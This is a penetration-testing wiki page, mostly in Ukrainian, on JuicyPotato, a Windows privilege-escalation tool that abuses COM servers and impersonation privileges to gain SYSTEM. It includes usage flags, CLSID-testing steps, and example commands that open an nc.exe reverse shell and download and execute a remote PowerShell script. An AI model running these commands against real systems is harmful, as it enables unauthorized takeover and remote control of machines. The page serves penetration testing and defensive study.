# JuicyPotato

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="warning" %}
**JuicyPotato не працює** на Windows Server 2019 та Windows 10 версії 1809 і новіших. Однак, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) можуть бути використані для **отримання тих же привілеїв і доступу на рівні `NT AUTHORITY\SYSTEM`**. _**Перевірте:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (зловживання золотими привілеями) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Цукрова версія_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, з трохи соку, тобто **інший інструмент для підвищення локальних привілеїв, з облікових записів служб Windows до NT AUTHORITY\SYSTEM**_

#### Ви можете завантажити juicypotato з [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Резюме <a href="#summary" id="summary"></a>

[**З Readme juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) та його [варіанти](https://github.com/decoder-it/lonelypotato) використовують ланцюг підвищення привілеїв на основі [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [сервісу](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126), маючи MiTM слухача на `127.0.0.1:6666`, і коли у вас є привілеї `SeImpersonate` або `SeAssignPrimaryToken`. Під час огляду збірки Windows ми виявили налаштування, де `BITS` був навмисно вимкнений, а порт `6666` був зайнятий.

Ми вирішили озброїти [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Привітайте Juicy Potato**.

> Для теорії дивіться [Rotten Potato - Підвищення привілеїв з облікових записів служб до SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) і слідкуйте за ланцюгом посилань і посилань.

Ми виявили, що, окрім `BITS`, є кілька COM-серверів, які ми можемо зловживати. Вони просто повинні:

1. бути інстанційованими поточним користувачем, зазвичай "користувачем служби", який має привілеї імперсонації
2. реалізовувати інтерфейс `IMarshal`
3. працювати як підвищений користувач (SYSTEM, Адміністратор, …)

Після деяких тестувань ми отримали та протестували розширений список [цікавих CLSID](http://ohpe.it/juicy-potato/CLSID/) на кількох версіях Windows.

### Соковиті деталі <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato дозволяє вам:

* **Цільовий CLSID** _виберіть будь-який CLSID, який ви хочете._ [_Тут_](http://ohpe.it/juicy-potato/CLSID/) _ви можете знайти список, організований за ОС._
* **COM порт прослуховування** _визначте COM порт прослуховування, який ви віддаєте перевагу (замість зашитого 6666)_
* **IP-адреса прослуховування COM** _прив'яжіть сервер до будь-якої IP-адреси_
* **Режим створення процесу** _в залежності від привілеїв імперсованого користувача ви можете вибрати з:_
* `CreateProcessWithToken` (потрібен `SeImpersonate`)
* `CreateProcessAsUser` (потрібен `SeAssignPrimaryToken`)
* `обидва`
* **Процес для запуску** _запустіть виконуваний файл або скрипт, якщо експлуатація успішна_
* **Аргумент процесу** _налаштуйте аргументи запущеного процесу_
* **Адреса RPC-сервера** _для прихованого підходу ви можете аутентифікуватися на зовнішньому RPC-сервері_
* **Порт RPC-сервера** _корисно, якщо ви хочете аутентифікуватися на зовнішньому сервері, а брандмауер блокує порт `135`…_
* **РЕЖИМ ТЕСТУ** _в основному для тестування, тобто тестування CLSID. Він створює DCOM і виводить користувача токена. Дивіться_ [_тут для тестування_](http://ohpe.it/juicy-potato/Test/)

### Використання <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**З juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Якщо у користувача є привілеї `SeImpersonate` або `SeAssignPrimaryToken`, то ви **SYSTEM**.

Майже неможливо запобігти зловживанню всіма цими COM-серверами. Ви можете подумати про зміну дозволів цих об'єктів через `DCOMCNFG`, але удачі, це буде складно.

Фактичне рішення полягає в захисті чутливих облікових записів та програм, які працюють під обліковими записами `* SERVICE`. Зупинка `DCOM` безумовно завадить цій експлуатації, але може мати серйозний вплив на основну ОС.

З: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Examples

Note: Visit [this page](https://ohpe.it/juicy-potato/CLSID/) for a list of CLSIDs to try.

### Get a nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Запустіть новий CMD (якщо у вас є доступ до RDP)

![](<../../.gitbook/assets/image (300).png>)

## Проблеми з CLSID

Часто стандартний CLSID, який використовує JuicyPotato, **не працює** і експлойт зазнає невдачі. Зазвичай, потрібно кілька спроб, щоб знайти **працюючий CLSID**. Щоб отримати список CLSID для конкретної операційної системи, вам слід відвідати цю сторінку:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Перевірка CLSID**

Спочатку вам знадобляться деякі виконувані файли, окрім juicypotato.exe.

Завантажте [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) і завантажте його у вашу PS сесію, а також завантажте та виконайте [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Цей скрипт створить список можливих CLSID для тестування.

Потім завантажте [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat) (змініть шлях до списку CLSID та до виконуваного файлу juicypotato) і виконайте його. Він почне пробувати кожен CLSID, і **коли номер порту зміниться, це означатиме, що CLSID спрацював**.

**Перевірте** працюючі CLSID **за допомогою параметра -c**

## Посилання

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)


{% hint style="success" %}
Вчіться та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вчіться та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримка HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
